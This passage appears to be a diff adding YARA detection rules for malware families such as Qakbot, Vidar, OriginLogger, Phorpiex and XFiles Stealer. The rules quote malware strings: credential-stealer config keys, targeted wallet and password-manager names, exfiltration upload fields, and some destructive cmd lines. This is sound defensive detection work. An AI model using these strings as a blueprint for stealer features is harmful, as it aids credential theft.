+    yarahub_license =           "CC BY-NC-SA 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5 =     "8fc15b030254c0d49f18d06c696d6986"
+
+  strings:
+    $fowler_noll_vo_hash = {C5 9D 1C 81 [1-100] 93 01 00 01}
+
+    // encrypted stack string of size 65 (ex: b64 alphabet + \x00)
+    $x1 = /\xC7\x45.\x41\x00\x00\x00(\xC6\x45..){65}/  
+    // C7 45 F8 0A 00 00 00     mov  DWORD PTR  [ebp+var_8], 65 ; str size
+    // C6 45 F0 22              mov  BYTE PTR   [ebp+var_10], 22h  ; 65 movs
+    
+    // encrypted stack string of size >= 10 and last encrypted byte is 1
+    $x2 = /\xC7\x45..\x00\x00\x00(\xC6\x45..){10,}\xC6\x45.\x01/
+
+  condition:
+    uint16(0) == 0x5A4D and // MZ
+    pe.characteristics & pe.DLL and 
+    filesize < 1MB and 
+    $fowler_noll_vo_hash and 
+    any of ($x*)
+}rule win_modern_loader_v1_01_1edf {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-12-08"
+        description               = "matches unpacked ModernLoader samples"
+        hash_md5                  = "c6897769c0af03215d61e8e63416e5fc"
+        hash_sha1                 = "12261b515dabba8a5bb0daf0a904792d3acd8f9b"
+        hash_sha256               = "ceae593f359a902398e094e1cdbc4502c8fd0ba6b71e625969da6df5464dea95"
+        malpedia_family           = "win.modern_loader"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.01"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "c6897769c0af03215d61e8e63416e5fc"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "1edff524-1b52-494c-8d61-3daf5998b8cc"
+
+    strings:
+        $log_01 = "[DEBUG] Download & Execute Content: <" wide
+        $log_02 = "[DEBUG] Execute Content: <" wide
+        $log_03 = "[DEBUG] Init Completed Response: <" wide
+        $log_04 = "[DEBUG] Listen Response: <" wide
+        $log_05 = "[DEBUG] Task Completed Response: <" wide
+        $log_06 = "[DEBUG] Task Failed Response: <" wide
+        $log_07 = "[DEBUG] Task Result: <" wide
+        $log_08 = "[ERROR] Creating Request Failed" wide
+        $log_09 = "[ERROR] Listen Failed" wide
+        $log_10 = "[ERROR] No available tasks or tasks parsing error" wide
+        $log_11 = "[ERROR] Reading Response Failed" wide
+
+        $fingerprint_1 = "\"AntiVirus\":\"N/A\"," wide
+        $fingerprint_2 = "\"CORP\":\"N/A\"," wide
+        $fingerprint_3 = "\"Network PCs\":\"N/A\"}" wide
+        $fingerprint_4 = "\"RDP\":\"" wide
+        $fingerprint_5 = "\"Role\":\"Admin\"," wide
+        $fingerprint_6 = "\"Role\":\"User\"," wide
+        $fingerprint_7 = "\"Total Space\":\"" wide
+        $fingerprint_8 = "\"Version\":\"" wide
+
+        $varia_01 = "%XBoxLive%" wide
+        $varia_02 = "AddressWidth" wide
+        $varia_03 = "C:\\Users\\Public\\Documents\\Data\\hidden_service\\hostn" wide
+        $varia_04 = "Download & Execute" wide
+        $varia_05 = "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENT" wide
+        $varia_06 = "ProcessorNameString" wide
+        $varia_07 = "RALPROCESSOR\\0" wide
+        $varia_08 = "Win32_ComputerSystem" wide
+        $varia_09 = "partofdomain" wide
+        $varia_10 = "root\\SecurityCenter2" wide
+
+        $sql_1 = "SELECT * FROM AntivirusProduct" wide
+        $sql_2 = "SELECT * FROM Win32_DisplayConfiguration" wide
+        $sql_3 = "SELECT Caption FROM Win32_OperatingSystem" wide
+        $sql_4 = "SELECT UUID FROM Win32_ComputerSystemProduct" wide
+        $sql_5 = "select * from Win32_Processor" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            30 of them
+        )
+}
+rule win_origin_logger_b5c8 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-09-22"
+        description               = "detects Orign Logger"
+        hash_md5                  = "bd9981b13c37d3ba04e55152243b1e3e"
+        hash_sha1                 = "4669160ec356a8640cef92ddbaf7247d717a3ef1"
+        hash_sha256               = "595a7ea981a3948c4f387a5a6af54a70a41dd604685c72cbd2a55880c2b702ed"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "bd9981b13c37d3ba04e55152243b1e3e"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "b5c88eec-323f-46eb-b8c3-9cf5d8ca0e1f"
+
+    strings:
+        $name           = "OriginLogger" wide
+        $exe            = "OriginLogger.exe" wide
+        $cfg_section_0  = "[LOGSETTINGS]"
+        $cfg_section_1  = "[ASSEMBLY]"
+        $cfg_section_2  = "[STEALER]"
+        $cfg_section_3  = "[BINDER]"
+        $cfg_section_4  = "[INSTALLATION]"
+        $cfg_section_5  = "[OPTIONS]"
+        $cfg_section_6  = "[DOWNLOADER]"
+        $cfg_section_7  = "[EXTENSION]"
+        $cfg_section_8  = "[FILEPUMPER]"
+        $cfg_section_9  = "[FAKEMSG]"
+        $cfg_section_10 = "[HOST]"
+        $cfg_section_11 = "[BUILD]"
+        $cfg_entries_0  = "BinderON="
+        $cfg_entries_1  = "blackhawk="
+        $cfg_entries_2  = "centbrowser="
+        $cfg_entries_3  = "chedot="
+        $cfg_entries_4  = "citrio="
+        $cfg_entries_5  = "clawsmail="
+        $cfg_entries_6  = "CloneON="
+        $cfg_entries_7  = "coccoc="
+        $cfg_entries_8  = "Coolnovo="
+        $cfg_entries_9  = "coowon="
+        $cfg_entries_10 = "cyberfox="
+        $cfg_entries_11 = "Delaysec="
+        $cfg_entries_12 = "dest_date="
+        $cfg_entries_13 = "Disablecp="
+        $cfg_entries_14 = "Disablemsconfig="
+        $cfg_entries_15 = "Disablesysrestore="
+        $cfg_entries_16 = "DownloaderON="
+        $cfg_entries_17 = "emclient="
+        $cfg_entries_18 = "epicpb="
+        $cfg_entries_19 = "estensionON="
+        $cfg_entries_20 = "Eudora="
+        $cfg_entries_21 = "falkon="
+        $cfg_entries_22 = "FileassemblyON="
+        $cfg_entries_23 = "FlashFXP="
+        $cfg_entries_24 = "FPRadiobut="
+        $cfg_entries_25 = "HostON="
+        $cfg_entries_26 = "icecat="
+        $cfg_entries_27 = "icedragon="
+        $cfg_entries_28 = "IconON="
+        $cfg_entries_29 = "IncrediMail="
+        $cfg_entries_30 = "iridium="
+        $cfg_entries_31 = "JustOne="
+        $cfg_entries_32 = "kmeleon="
+        $cfg_entries_33 = "kometa="
+        $cfg_entries_34 = "liebao="
+        $cfg_entries_35 = "orbitum="
+        $cfg_entries_36 = "palemoon="
+        $cfg_entries_37 = "pumderON="
+        $cfg_entries_38 = "pumpertext="
+        $cfg_entries_39 = "qqbrowser="
+        $cfg_entries_40 = "screeninterval="
+        $cfg_entries_41 = "SelectFolder="
+        $cfg_entries_42 = "sleipnir="
+        $cfg_entries_43 = "SmartLogger="
+        $cfg_entries_44 = "smartLoggerType="
+        $cfg_entries_45 = "SmartWords="
+        $cfg_entries_46 = "sputnik="
+        $cfg_entries_47 = "telegram_api="
+        $cfg_entries_48 = "telegram_chatid="
+        $cfg_entries_49 = "toemail="
+        $cfg_entries_50 = "trillian="
+        $cfg_entries_51 = "UCBrowser="
+        $cfg_entries_52 = "USBSpread="
+        $cfg_entries_53 = "vivaldi="
+        $cfg_entries_54 = "waterfox="
+        $cfg_entries_55 = "WebFilterON="
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (#name >= 4 or #exe >= 2) and
+        10 of ($cfg_section_*)  and
+        50 of ($cfg_entries_*)
+    }
+rule win_phorpiex_a_84fc {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-12-13"
+        description               = "detects unpacked Phorpiex samples"
+        hash_md5                  = "6b6398fa7d461b09b8652ec0f8bafeb4"
+        hash_sha1                 = "43bf88ea96bb4de9f4bbc66686820260033cd2d7"
+        hash_sha256               = "bd2976d327a94f87c933a3632a1c56d0050b047506f5146b1a47d2b9fd5b798d"
+        malpedia_family           = "win.phorpiex"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "6b6398fa7d461b09b8652ec0f8bafeb4"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "84fc2940-d204-4d75-9f17-89cce6b1dea2"
+
+    strings:
+        $str_1 = ":--tLdr--:"
+        $str_2 = "T-449505056674060607" wide
+
+        $path_1 = "\\public_html" wide
+        $path_2 = "\\htdocs" wide
+        $path_3 = "\\httpdocs" wide
+        $path_4 = "\\wwwroot" wide
+        $path_5 = "\\ftproot" wide
+        $path_6 = "\\share" wide
+        $path_7 = "\\income" wide
+        $path_8 = "\\upload" wide
+
+        $cmd_0 = "/c start _ & _\\DeviceManager.exe & exit" wide
+        $cmd_1 = "%ls\\_\\DeviceConfigManager.exe" wide
+        $cmd_2 = "%ls\\_\\DeviceManager.exe" wide
+        $cmd_3 = "/c rmdir /q /s \"%ls\"" wide
+        $cmd_4 = "/c move /y \"%ls\", \"%ls\"" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        all of ($str*) or
+        all of ($path*) or
+        all of ($cmd*)
+}
+rule win_qakbot_malped {
+
+    meta:
+        author = "Felix Bilstein - yara-signator at cocacoding dot com"
+        date = "2022-05-16"
+        version = "1"
+        description = "Detects win.qakbot."
+        info = "autogenerated rule brought to you by yara-signator"
+        tool = "yara-signator v0.6.0"
+        signator_config = "callsandjumps;datarefs;binvalue"
+		yarahub_reference_md5 = "f1e66f626c6c4a52bf3efc0518d06303"
+		yarahub_uuid = "47f26609-8c11-4707-b9c6-27aef4d99086"
+        malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot"
+        malpedia_rule_date = "20220513"
+        malpedia_hash = "7f4b2229e6ae614d86d74917f6d5b41890e62a26"
+        malpedia_version = "20220516"
+        malpedia_license = "CC BY-SA 4.0"
+		yarahub_license	= "CC BY-SA 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+        malpedia_sharing = "TLP:WHITE"
+
+    /* DISCLAIMER
+     * The strings used in this rule have been automatically selected from the
+     * disassembly of memory dumps and unpacked files, using YARA-Signator.
+     * The code and documentation is published here:
+     * https://github.com/fxb-cocacoding/yara-signator
+     * As Malpedia is used as data source, please note that for a given
+     * number of families, only single samples are documented.
+     * This likely impacts the degree of generalization these rules will offer.
+     * Take the described generation method also into consideration when you
+     * apply the rules in your use cases and assign them confidence levels.
+     */
+
+
+    strings:
+        $sequence_0 = { c9 c3 55 8bec 81ecc4090000 }
+            // n = 5, score = 4900
+            //   c9                   | leave               
+            //   c3                   | ret                 
+            //   55                   | push                ebp
+            //   8bec                 | mov                 ebp, esp
+            //   81ecc4090000         | sub                 esp, 0x9c4
+
+        $sequence_1 = { 33c0 7402 ebfa e8???????? }
+            // n = 4, score = 4800
+            //   33c0                 | xor                 eax, eax
+            //   7402                 | je                  4
+            //   ebfa                 | jmp                 0xfffffffc
+            //   e8????????           |                     
+
+        $sequence_2 = { 740d 8d45fc 6a00 50 e8???????? 59 59 }
+            // n = 7, score = 4800
+            //   740d                 | je                  0xf
+            //   8d45fc               | lea                 eax, [ebp - 4]
+            //   6a00                 | push                0
+            //   50                   | push                eax
+            //   e8????????           |                     
+            //   59                   | pop                 ecx
+            //   59                   | pop                 ecx
+
+        $sequence_3 = { 50 e8???????? 8b06 47 59 }
+            // n = 5, score = 4800
+            //   50                   | push                eax
+            //   e8????????           |                     
+            //   8b06                 | mov                 eax, dword ptr [esi]
+            //   47                   | inc                 edi
+            //   59                   | pop                 ecx
+
+        $sequence_4 = { ebfa eb06 33c0 7402 }
+            // n = 4, score = 4600
+            //   ebfa                 | jmp                 0xfffffffc
+            //   eb06                 | jmp                 8
+            //   33c0                 | xor                 eax, eax
+            //   7402                 | je                  4
+
+        $sequence_5 = { 7402 ebfa 33c0 7402 }
+            // n = 4, score = 4600
+            //   7402                 | je                  4
+            //   ebfa                 | jmp                 0xfffffffc
+            //   33c0                 | xor                 eax, eax
+            //   7402                 | je                  4
+
+        $sequence_6 = { 50 ff5508 8bf0 59 }
+            // n = 4, score = 4300
+            //   50                   | push                eax
+            //   ff5508               | call                dword ptr [ebp + 8]
+            //   8bf0                 | mov                 esi, eax
+            //   59                   | pop                 ecx
+
+        $sequence_7 = { 57 ff15???????? 33c0 85f6 0f94c0 }
+            // n = 5, score = 4100
+            //   57                   | push                edi
+            //   ff15????????         |                     
+            //   33c0                 | xor                 eax, eax
+            //   85f6                 | test                esi, esi
+            //   0f94c0               | sete                al
+
+        $sequence_8 = { c1e814 40 c1e014 50 }
+            // n = 4, score = 4000
+            //   c1e814               | shr                 eax, 0x14
+            //   40                   | inc                 eax
+            //   c1e014               | shl                 eax, 0x14
+            //   50                   | push                eax
+
+        $sequence_9 = { e8???????? 83c410 33c0 7402 }
+            // n = 4, score = 4000
+            //   e8????????           |                     
+            //   83c410               | add                 esp, 0x10
+            //   33c0                 | xor                 eax, eax
+            //   7402                 | je                  4
+
+        $sequence_10 = { c74508???????? e8???????? 85c0 7d08 }
+            // n = 4, score = 3900
+            //   c74508????????       |                     
+            //   e8????????           |                     
+            //   85c0                 | test                eax, eax
+            //   7d08                 | jge                 0xa
+
+        $sequence_11 = { 750c 57 ff15???????? 6afe }
+            // n = 4, score = 3900
+            //   750c                 | jne                 0xe
+            //   57                   | push                edi
+            //   ff15????????         |                     
+            //   6afe                 | push                -2
+
+        $sequence_12 = { c3 33c9 3d80000000 0f94c1 }
+            // n = 4, score = 3900
+            //   c3                   | ret                 
+            //   33c9                 | xor                 ecx, ecx
+            //   3d80000000           | cmp                 eax, 0x80
+            //   0f94c1               | sete                cl
+
+        $sequence_13 = { 57 6a00 6a02 ff15???????? 8bf8 83c8ff }
+            // n = 6, score = 3900
+            //   57                   | push                edi
+            //   6a00                 | push                0
+            //   6a02                 | push                2
+            //   ff15????????         |                     
+            //   8bf8                 | mov                 edi, eax
+            //   83c8ff               | or                  eax, 0xffffffff
+
+        $sequence_14 = { 8d853cf6ffff 50 6a0c 6a0a }
+            // n = 4, score = 3800
+            //   8d853cf6ffff         | lea                 eax, [ebp - 0x9c4]
+            //   50                   | push                eax
+            //   6a0c                 | push                0xc
+            //   6a0a                 | push                0xa
+
+        $sequence_15 = { 6a00 58 0f95c0 40 50 }
+            // n = 5, score = 3700
+            //   6a00                 | push                0
+            //   58                   | pop                 eax
+            //   0f95c0               | setne               al
+            //   40                   | inc                 eax
+            //   50                   | push                eax
+
+        $sequence_16 = { 85c0 750a 33c0 7402 }
+            // n = 4, score = 3700
+            //   85c0                 | test                eax, eax
+            //   750a                 | jne                 0xc
+            //   33c0                 | xor                 eax, eax
+            //   7402                 | je                  4
+
+        $sequence_17 = { 50 68???????? 6a3f 8d45c0 }
+            // n = 4, score = 3600
+            //   50                   | push                eax
+            //   68????????           |                     
+            //   6a3f                 | push                0x3f
+            //   8d45c0               | lea                 eax, [ebp - 0x40]
+
+        $sequence_18 = { 837d0800 7507 c74508???????? e8???????? }
+            // n = 4, score = 3600
+            //   837d0800             | cmp                 dword ptr [ebp + 8], 0
+            //   7507                 | jne                 9
+            //   c74508????????       |                     
+            //   e8????????           |                     
+
+        $sequence_19 = { 83c40c 33c0 5b 5f 5e c9 c3 }
+            // n = 7, score = 3500
+            //   83c40c               | add                 esp, 0xc
+            //   33c0                 | xor                 eax, eax
+            //   5b                   | pop                 ebx
+            //   5f                   | pop                 edi
+            //   5e                   | pop                 esi
+            //   c9                   | leave               
+            //   c3                   | ret                 
+
+        $sequence_20 = { ff750c 8d85d8feffff 50 ff5508 }
+            // n = 4, score = 3500
+            //   ff750c               | push                dword ptr [ebp + 0xc]
+            //   8d85d8feffff         | lea                 eax, [ebp - 0x128]
+            //   50                   | push                eax
+            //   ff5508               | call                dword ptr [ebp + 8]
+
+        $sequence_21 = { 01c1 8b442448 01c8 8944243c }
+            // n = 4, score = 100
+            //   01c1                 | add                 ecx, eax
+            //   8b442448             | mov                 eax, dword ptr [esp + 0x48]
+            //   01c8                 | add                 eax, ecx
+            //   8944243c             | mov                 dword ptr [esp + 0x3c], eax
+
+        $sequence_22 = { 01c1 894c2430 e9???????? 55 }
+            // n = 4, score = 100
+            //   01c1                 | add                 ecx, eax
+            //   894c2430             | mov                 dword ptr [esp + 0x30], ecx
+            //   e9????????           |                     
+            //   55                   | push                ebp
+
+        $sequence_23 = { 00ca 66897c2446 31f6 8974244c }
+            // n = 4, score = 100
+            //   00ca                 | add                 dl, cl
+            //   66897c2446           | mov                 word ptr [esp + 0x46], di
+            //   31f6                 | xor                 esi, esi
+            //   8974244c             | mov                 dword ptr [esp + 0x4c], esi
+
+        $sequence_24 = { 00e9 8b55e4 880c1a 8a4df3 }
+            // n = 4, score = 100
+            //   00e9                 | add                 cl, ch
+            //   8b55e4               | mov                 edx, dword ptr [ebp - 0x1c]
+            //   880c1a               | mov                 byte ptr [edx + ebx], cl
+            //   8a4df3               | mov                 cl, byte ptr [ebp - 0xd]
+
+        $sequence_25 = { 01c1 894c2404 8b442404 8d65fc }
+            // n = 4, score = 100
+            //   01c1                 | add                 ecx, eax
+            //   894c2404             | mov                 dword ptr [esp + 4], ecx
+            //   8b442404             | mov                 eax, dword ptr [esp + 4]
+            //   8d65fc               | lea                 esp, [ebp - 4]
+
+        $sequence_26 = { 01c1 81e1ffff0000 83c101 8b442474 }
+            // n = 4, score = 100
+            //   01c1                 | add                 ecx, eax
+            //   81e1ffff0000         | and                 ecx, 0xffff
+            //   83c101               | add                 ecx, 1
+            //   8b442474             | mov                 eax, dword ptr [esp + 0x74]
+
+        $sequence_27 = { 01c1 21d1 8a442465 f6642465 }
+            // n = 4, score = 100
+            //   01c1                 | add                 ecx, eax
+            //   21d1                 | and                 ecx, edx
+            //   8a442465             | mov                 al, byte ptr [esp + 0x65]
+            //   f6642465             | mul                 byte ptr [esp + 0x65]
+
+        $sequence_28 = { 00e9 884c0451 83c001 39d0 }
+            // n = 4, score = 100
+            //   00e9                 | add                 cl, ch
+            //   884c0451             | mov                 byte ptr [esp + eax + 0x51], cl
+            //   83c001               | add                 eax, 1
+            //   39d0                 | cmp                 eax, edx
+
+    condition:
+        7 of them and filesize < 958464
+}rule win_strelastealer : stealer
+{
+    meta:
+        author                    = "@_FirehaK <yara@firehak.com>"
+        date                      = "2022-11-18"
+        description               = "Detects Strela Stealer"
+        malpedia_family           = "win.strelastealer"
+        modified                  = "2022-11-18"
+        reference                 = "https://medium.com/@DCSO_CyTec/shortandmalicious-strelastealer-aims-for-mail-credentials-a4c3e78c8abc"
+        yarahub_author_twitter    = "@_FirehaK"
+        yarahub_author_email      = "yara@firehak.com"
+        yarahub_reference_link    = "https://medium.com/@DCSO_CyTec/shortandmalicious-strelastealer-aims-for-mail-credentials-a4c3e78c8abc"
+        yarahub_reference_md5     = "57ec0f7cf124d1ae3b73e643a6ac1dad"
+        yarahub_uuid              = "685f9c70-2e4f-42ba-9e9e-77d022de6d0e"
+        yarahub_license           = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+
+    strings:
+        $s1 = "StrelaDLLCompile" ascii
+
+        $x1 = { 8d4c24?? 51 6a00 6a00 ff15????0010 ff15????0010 3db7000000 74?? e8????ffff e8????ffff 8b8c24????0000 5f 5e 5b 33cc 33c0 e8???????? 8be5 5d c3 }
+        $xor_string = { (33d2 8bc?|8bc? 33d2) f7f? 4? 8a(82|92)???????? 30(44|54)??ff (3b|83??)?? 72 }
+
+    condition:
+        uint16(0) == 0x5a4d
+        and any of them
+}rule win_tofsee_bot
+{
+  meta:
+    author       = "akrasuski1"
+    published_at = "https://gist.github.com/akrasuski1/756ae39f96d2714087e6d7f252a95b19"
+    revision_by  = "andretavare5"
+    description  = "Tofsee malware"
+    org          = "BitSight"
+    date         = "2023-03-24"
+	yarahub_author_twitter =    "@andretavare5"
+    yarahub_reference_link =    "https://www.bitsight.com/blog/tofsee-botnet-proxying-and-mining"
+    yarahub_malpedia_family =   "win.tofsee"
+    yarahub_uuid =              "bc8f6b49-01a2-467a-a619-960fc2cb5f7f"
+    yarahub_license =           "CC BY-NC-SA 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5 =     "92e466525e810b79ae23eac344a52027"
+
+  strings:
+    $decryptStr  = {32 55 14 88 10 8A D1 02 55 18 F6 D9 00 55 14}
+    $xorGreet    = {C1 EB 03 C0 E1 05 0A D9 32 DA 34 C6 88 1E}
+    $xorCrypt    = {F7 FB 8A 44 0A 04 30 06 FF 41 0C}
+    $string_res1 = "loader_id"
+    $string_res2 = "born_date"
+    $string_res3 = "work_srv"
+    $string_res4 = "flags_upd"
+    $string_res5 = "lid_file_upd"
+    $string_res6 = "localcfg"
+    $string_var0 = "%RND_NUM"
+    $string_var1 = "%SYS_JR"
+    $string_var2 = "%SYS_N"
+    $string_var3 = "%SYS_RN"
+    $string_var4 = "%RND_SPACE"
+    $string_var5 = "%RND_DIGIT"
+    $string_var6 = "%RND_HEX"
+    $string_var7 = "%RND_hex"
+    $string_var8 = "%RND_char"
+    $string_var9 = "%RND_CHAR"
+
+  condition:
+    (7 of ($string_var*) 
+      and 4 of ($string_res*)) 
+    or (7 of ($string_var*) 
+      and 2 of ($decryptStr, $xorGreet, $xorCrypt)) 
+    or (4 of ($string_res*) 
+      and 2 of ($decryptStr, $xorGreet, $xorCrypt))
+}rule win_vidar_a_a901 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2023-03-30"
+        description               = "detect unpacked Vidar samples"
+        hash_md5                  = "ed4ddd89e6ab5211cd7fdbfe51d9576b"
+        hash_sha1                 = "7b6beb9870646bc50b10014536ed3bb088a2e3de"
+        hash_sha256               = "352f8e45cd6085eea17fffeeef91251192ceaf494336460cc888bbdd0051ec71"
+        malpedia_family           = "win.vidar"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "ed4ddd89e6ab5211cd7fdbfe51d9576b"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "a901638e-af37-42a0-a4c5-8f20d4a7e148"
+
+    strings:
+        $leet_sleep  = {6A 01 FF D6 6A 03 FF D6 6A 03 FF D6 6A 07 FF D6}
+
+        $wallets_01 = "Enkrypt"
+        $wallets_02 = "Braavos"
+        $wallets_03 = "Exodus Web3 Wallet"
+        $wallets_04 = "Trust Wallet"
+        $wallets_05 = "Tronium"
+        $wallets_06 = "Opera Wallet"
+        $wallets_07 = "OKX Web3 Wallet"
+        $wallets_08 = "Sender"
+        $wallets_09 = "Hashpack"
+        $wallets_10 = "Eternl"
+        $wallets_11 = "GeroWallet"
+        $wallets_12 = "Pontem Wallet"
+        $wallets_13 = "Martian Wallet"
+        $wallets_14 = "Finnie"
+        $wallets_15 = "Leap Terra"
+        $wallets_16 = "Microsoft AutoFill"
+        $wallets_17 = "Bitwarden"
+        $wallets_18 = "KeePass Tusk"
+        $wallets_19 = "KeePassXC-Browser"
+
+        $telegram_1 = "shortcuts-default.json"
+        $telegram_2 = "shortcuts-custom.json"
+        $telegram_3 = "settingss"
+        $telegram_4 = "prefix"
+        $telegram_5 = "countries"
+        $telegram_6 = "usertag"
+
+        $scp = "Software\\Martin Prikryl\\WinSCP 2\\Configuration" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            #leet_sleep > 10 and
+            (16 of ($wallets_*) and all of ($telegram_*) and $scp)
+        )
+}
+rule win_xfiles_stealer_a8b373fb {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-04-15"
+        description               = "detects XFiles-Stealer"
+        hash                      = "d06072f959d895f2fc9a57f44bf6357596c5c3410e90dabe06b171161f37d690"
+        hash2                     = "1ed070e0d33db9f159a576e6430c273c"
+        malpedia_family           = "win.xfilesstealer"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "1ed070e0d33db9f159a576e6430c273c"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "a8b373fb-337a-4c3c-9387-78c294c8017d"
+
+    strings:
+        $ad_1 = "Telegram bot - @XFILESShop_Bot" wide
+        $ad_2 = "Telegram support - @XFILES_Seller" wide
+
+        $names_1 = "XFiles.Models.Yeti"
+        $names_2 = "anti_vzlom_popki" // анти взлом попки
+        $names_3 = "assType"
+        $names_4 = "hackrjaw"
+
+        $upload_1  = "zipx" wide
+        $upload_2  = "user_id" wide
+        $upload_3  = "passworlds_x" wide
+        $upload_4  = "ip_x" wide
+        $upload_5  = "cc_x" wide
+        $upload_6  = "cookies_x" wide
+        $upload_7  = "zip_x" wide
+        $upload_8  = "contry_x" wide
+        $upload_9  = "tag_x" wide
+        $upload_10 = "piece" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            all of ($ad_*) or
+            all of ($names_*) or
+            all of ($upload_*)
+        )
+}
+rule win_xwormmm_s1_6f74 {
+
+    meta:
+        author                    = "Johannes Bader"
+        date                      = "2022-11-13"
+        description               = "detects unpacked Xwormmm samples"
+        hash1_md5                 = "6005e1ccaea62626a5481e09bbb653da"
+        hash1_sha1                = "74138872ec0d0791b7f58eda8585250af40feaf9"
+        hash1_sha256              = "7fc6a365af13150e7b1738129832ebd91f1010705b0ab0955a295e2c7d88be62"
+        tlp                       = "TLP:WHITE"
+        version                   = "v1.0"
+        yarahub_author_email      = "yara@bin.re"
+        yarahub_author_twitter    = "@viql"
+        yarahub_license           = "CC BY-SA 4.0"
+        yarahub_reference_md5     = "6005e1ccaea62626a5481e09bbb653da"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+        yarahub_uuid              = "6f74e598-0f7c-42f4-9730-1925d1b08ebe"
+
+    strings:
+        $str_01 = "Mutexx"
+        $str_02 = "USBS"
+        $str_03 = "_appMutex"
+        $str_04 = "dTimer2"
+        $str_05 = "dosstu"
+        $str_06 = "nameee"
+        $str_07 = "ruta"
+        $str_08 = "usbSP"
+        $str_09 = "GetEncoderInfo"
+        $str_10 = "AppendOutputText"
+        $str_11 = "capCreateCaptureWindowA"
+        $str_12 = "capGetDriverDescriptionA"
+        $str_13 = "MyProcess_ErrorDataReceived"
+        $str_14 = "MyProcess_OutputDataReceived"
+        $str_15 = "STOBS64"
+        $str_16 = "keybd_event"
+        $str_17 = "AES_Decryptor"
+        $str_18 = "AES_Encryptor"
+        $str_19 = "tickees"
+        $str_20 = "INDATE"
+        $str_21 = "GetHashT"
+        $str_22 = "isDisconnected"
+
+        $str_23   = "PING?" wide
+        $str_24   = "IsInRole" wide
+        $str_25   = "Select * from AntivirusProduct" wide
+        $str_26   = "FileManagerSplitFileManagerSplit" wide
+        $str_27   = "\nError: " wide
+        $str_28   = "[Folder]" wide
+
+        $str_29    = "XKlog.txt" wide
+        $str_30    = "<Xwormmm>" wide
+        $str_32    = "GfvaHzPAZuTqRREB" wide
+
+    condition:
+        uint16(0) == 0x5A4D and
+        (
+            20  of ($str*)
+        )
+}
+rule WIN32_MALWR_POSSIBLE_EMOTET_07_20
+{
+	meta:
+		description = "Possible EMOTET payload"
+		author = "Jesper Mikkelsen"
+		reference = "https://www.virustotal.com/gui/file/03665e203217c40ee4e82777fd756c8e696d4068f5346f39cc132bd8bc4dc3c7/details"
+		date = "2022-05-20"
+		yarahub_reference_md5 = "8e807154c587dcd490696b24a47c5e8a"
+		yarahub_uuid = "cf777866-cb84-4fb9-9a65-785fe57c42d1"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		sharing = "TLP:WHITE"
+		score = 75
+        dname = "TrojanSpy.Win32.EMOTET.SMU.hp"
+	strings:
+		$0 = {D3DFEA00B9C7D800C6D5E600A5B3D500AFBCE400A0AFE30095A3D8008090D8008897DB006A7AD8007785DE00EDEFFC003343D4004554D7005867D900828DE300C0C5F100DDE0F8001222CF002131D1006671E0008890E70099A0EA00FE}
+		$1 = {3130F3F2ADF2F3B9B5EAA23630B9F1ADADF43830F3A2E8FD30F9AFADABEF3E30F4AEF2F2EFAF303BA7A30036373040E800F730FBEFE8A2A6AAADF2F2AD3832A5E600443038BCA9ABADACAF3036F2F1ADF2F438379AE607}
